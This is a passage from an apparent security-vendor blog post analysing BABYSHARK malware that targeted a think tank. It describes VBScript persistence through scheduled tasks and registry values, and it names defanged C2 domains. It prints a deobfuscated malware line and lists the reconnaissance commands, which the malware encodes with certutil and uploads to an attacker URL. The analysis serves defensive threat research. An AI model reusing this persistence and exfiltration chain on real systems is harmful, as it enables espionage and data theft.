type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254"/></picture></div></figure><p>Aside from what looked like gibberish, there were the strings “<span class="highlight">manage</span>” with parentheses following it—almost to look like a function call, as if the parameters d=7 were passed in. Immediately following it was a <span class="highlight">johnbegin</span>-- and a significant amount of nonsense characters, and eventually a --<span class="highlight">johnend</span> string. The <span class="highlight">johnbegin</span> and <span class="highlight">johnend </span>text seemed to be delimiters to wrap around the random data… perhaps that was encoded data in some way!</p><p>With that breadcrumb, our ThreatOps team began looking over open-source research online to determine if others have seen these “<span class="highlight">johnbegin</span>” and “<span class="highlight">johnend</span>” markings.</p><p>North Korea&#x27;s recent BabyShark malware works with the fileless technique by downloading encrypted malicious scripts from Google drive. Malicious scripts distinguish between start and end with &quot;<span class="highlight">johnbegin</span>&quot; and &quot;<span class="highlight">johnend</span>&quot;. <a href="https://t.co/6INRjQeecs" target="_blank">pic.twitter.com/6INRjQeecs</a></p><blockquote>— IssueMakersLab (@issuemakerslab) <a href="https://twitter.com/issuemakerslab/status/1241250182810857480?ref_src=twsrc%5Etfw" target="_blank">March 21, 2020</a></blockquote><p><br/></p><p>Thanks to some shared intelligence by <a href="https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/" target="_blank">Palo Alto</a>’s Unit42, <a href="https://malware.news/t/understanding-detecting-c2-frameworks-babyshark/49865" target="_blank">malware reporting sites</a> and <a href="https://twitter.com/issuemakerslab/status/1241250182810857480" target="_blank">others</a>, we were able to discover that these delimiters were key indicators of a strain of malware dubbed BABYSHARK, known for being used by North Korean state-sponsored threat actors. </p><figure class="w-richtext-figure-type-image w-richtext-align-center" data-rt-type="image" data-rt-align="center"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1d97034fd2fd419ab32b6136dba41ad2"/></picture></div></figure><p>Doing our due diligence to read up on the great analysis and research from those who have seen this in the wild before us, it was clear the previous sightings dated back to the 2018-2019 timeframe. For this specific incident, the first indicators of compromise we uncovered were in March of 2021.</p><p><strong>Knowing that we were now digging into a malicious APT activity, we deployed our </strong><a href="/blog/threat-recap-process-insights-trial-by-fire" target="_blank" data-discover="true"><strong>Process Insights</strong></a><strong> functionality to this host and organization for even greater visibility.</strong></p><h2><strong>Peeling Back the Layers</strong></h2><p>With a better understanding of what we were looking at, we continued to dig through the <span class="highlight">qwert.vbs</span> sample. </p><p>From reading the code, we could see that this scheduled VBScript would download the contents of this Google Drive page on first execution and carve out the obfuscated data between the <span class="highlight">johnbegin</span> and <span class="highlight">johnend</span> delimiters to be saved as a file <span class="highlight">normal.crp</span>. Later, upon second execution by the scheduled task, the script deobfuscates the saved data and executes it as VBScript.</p><p>Considering we can see the deobfuscation routine, we can run that on our own and unravel <a href="https://gist.github.com/JohnHammond/32561b448f9d760b2a01dc8b0ce07efd" target="_blank">what actual code would be present and executed from <span class="highlight">normal.crp</span></a>.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:986px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="986px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcc91f2e930434d4bb67a735fbb2c9d02"/></picture></div></figure><p><strong>Note</strong>: This screenshot is an excerpt of the code present and the full file can be reviewed with the gist link above.</p><p>There is a <em>lot</em> to unpack and discuss within this VBScript code. We will start with the most interesting observation: the malware <em>checks the current username.</em></p><h2>The Cast of Characters</h2><p>We want to emphasize that the observed APT activity is highly targeted against this organization and affiliated individuals. </p><p>The target organization fits the category of “think tanks,” as alluded to in the very beginning of this post. Additionally, this target’s computer had a hostname referring to the owner and user—who, for partner confidentiality, we&#x27;ll refer to as Alex.</p><p>Alex&#x27;s computer was not the only host in this organization that Huntress was supporting—other devices with a hostname based on their user were visible to us, but during the time of our analysis, only Alex&#x27;s machine was online. To tell the whole story, we knew we needed access to another important user’s machine. We will refer to this user as <strong>Bob.</strong></p><p>Notice that the <span class="highlight">normal.crp</span> file <em>specifically</em> checks for the presence of the username “Administrator,” or our newly introduced character, “Bob.” The malware would not run if it was not under Bob. If the current username did <em>not</em> match either of these two names, the malware will reach out to an HTTP C2 server. The malware will then stop itself from executing on the system.</p><p>This was particularly interesting to us. This attack was tailored to focus only on Bob. If (and only if) the username matched Bob, then it would add persistence mechanisms in the Windows registry, stage new obfuscated files, and continue communications with its C2 servers.</p><h2>Following Breadcrumbs</h2><p>Noting the newly discovered activity from <span class="highlight">normal.crp</span>,  we found several other persistence mechanisms on the host. We discovered the scheduled task named <span class="highlight">Microsoft-Windows-UpdateDefender</span> that used another VBS script called <span class="highlight">sys0.vbs</span> to open up a registry key <span class="highlight">HKEY_CURRENT_USER\Software\RegisteredApplications\[random]</span> and perform some string replacement on the data stored there and execute the contents.</p><p>(This filename <span class="highlight">sys0.vbs</span> differs from the suggested <span class="highlight">sys1.vbs</span> name in the recovered <span class="highlight">normal.crp </span>script, but after finding both renditions on different hosts, both contain <a href="https://gist.github.com/JohnHammond/d59b9dc0858c4e0e7a1216f7a7eab636" target="_blank">the same contents</a>).</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1734px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1734px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94410005a0f346648b20f1be5b23b747"/></picture></div></figure><p>Examining the contents of the task file showed that the commands were executed every 29 minutes, while <span class="highlight">sys1.vbs</span> would be executed every 61 minutes.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1480px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1480px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F427c40b032c248f59ecf11fc8742c012"/></picture></div></figure><p>This was also confirmed by looking at the data collected by <em>Process Insights</em>. Process Insights is the newest addition to The Huntress Managed Security Platform, offering greater visibility and telemetry on actions performed on an endpoint <em>at the process level.</em> This captures information like process spawn time, origination, path and any subsequent child process data—in real-time. 😉</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1999px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1999px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46"/></picture></div></figure><p>(Click the above image to enlarge it)</p><p>The <span class="highlight">filexx.tmp</span> and <span class="highlight">schedxx.tmp</span> files were written to disk as means of checking if this code was executed previously. These files were not present on Alex&#x27;s machine at the time of our analysis.</p><p>The registry value at &quot;<span class="highlight">HKEY_CURRENT_USER\Software\RegisteredApplications\AppXr1bysyqf6kpaq1aje5sbadka8dgx3g4g</span>&quot; contained <a href="https://gist.github.com/JohnHammond/7b619e5baaf8e25bad652dd27bb826a3" target="_blank">even more VBScript code</a>.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1205px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1205px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123"/></picture></div></figure><p>This code reached out to a C2 domain to retrieve the contents for yet another new file, <span class="highlight">desktop.tmp</span>, if it was not already present. This code is exactly in line with what we uncovered from the <span class="highlight">normal.crp</span>, but it pulls from a different C2 domain (<span class="highlight">worldinfocontact[.]club</span> rather than <span class="highlight">hodbeast[.]com</span>). </p><p>The distinction between these domains seemed to be that <span class="highlight">worldinfocontact[.]club </span>is their <em>beaconing</em> command and control. It reached out to this C2 on a set interval, retrieved any pending commands to be executed, slept, then executed those new tasks. The response from <span class="highlight">worldinfocontact[.]club /111/alex/expres[.]php?op=2</span> was inherently going to vary from time to time as the threat actors queued new commands and scripts to execute remotely.</p><p>The contents of desktop.tmp were then subsequently changing as they were the last set of commands sent by the C2 server. </p><p>The <span class="highlight">desktop.tmp</span> file contents we uncovered on Alex&#x27;s machine were obfuscated commands to run the OneDrive.exe process. It is fair to say that this is the “fallback” procedure from the C2 (when no other commands were pending) to ensure whatever DLL hijacking they set up would continue to execute, even if the OneDrive process was stopped. We will revisit the alleged DLL hijacking technique in our analysis of other artifacts soon.</p><p>This deobfuscated <span class="highlight">desktop.tmp</span> on Alex&#x27;s host is below:</p><p><span class="highlight">On Error Resume Next:Set wShell=CreateObject(&quot;WScript.Shell&quot;):retu=wShell.run(&quot;&quot;&quot;%userprofile%\AppData\Local\Microsoft\OneDrive\onedrive.exe&quot;&quot; /background&quot;,0,false)</span></p><p>Bear in mind that this was returned from the <span class="highlight">worldinfocontact[.]club</span> endpoint. However, <span class="highlight">hodbeast[.]com</span>, on the other hand, returned obfuscated syntax that would ultimately run some enumeration commands and write the output to a file <span class="highlight">ttmp1.log</span>.</p><ul><li><span class="highlight">cmd.exe /c PowerShell Get-Process outlook ^| Format-List Path </span></li><li><span class="highlight">cmd.exe /c whoami</span></li><li><span class="highlight">cmd.exe /c net user</span></li><li><span class="highlight">tasklist</span></li></ul><p>The <span class="highlight">ttmp1.log</span> file is then Base64 encoded with <span class="highlight">certutil -f -encode</span> to be saved as <span class="highlight">ttmp.log</span> and then uploaded to <span class="highlight">https[:]//hodbeast.com/silver/upload[.]php</span> with a POST request.</p><p><strong>This data exfiltration technique is in line with </strong><a href="https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf" target="_blank"><strong>previous sightings</strong></a><strong> and is known in </strong><a href="https://attack.mitre.org/software/S0414/" target="_blank"><strong>the MITRE ATT&amp;CK page for BABYSHARK</strong></a><strong> malware.</strong></p><p>Finally, other files present on Alex&#x27;s machine were <a href="https://gist.github.com/JohnHammond/acd830ff6342bc027fadb3217ab08b79" target="_blank"><strong>desktop.r5u</strong> and <strong>desktop.xml</strong></a>. These files had identical contents. The “<strong>BEGIN</strong>” and “<strong>END</strong>” certificate delimiters indicate this file would also be unraveled with <strong>certutil</strong>.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:454px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="454px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?width=100 100w, 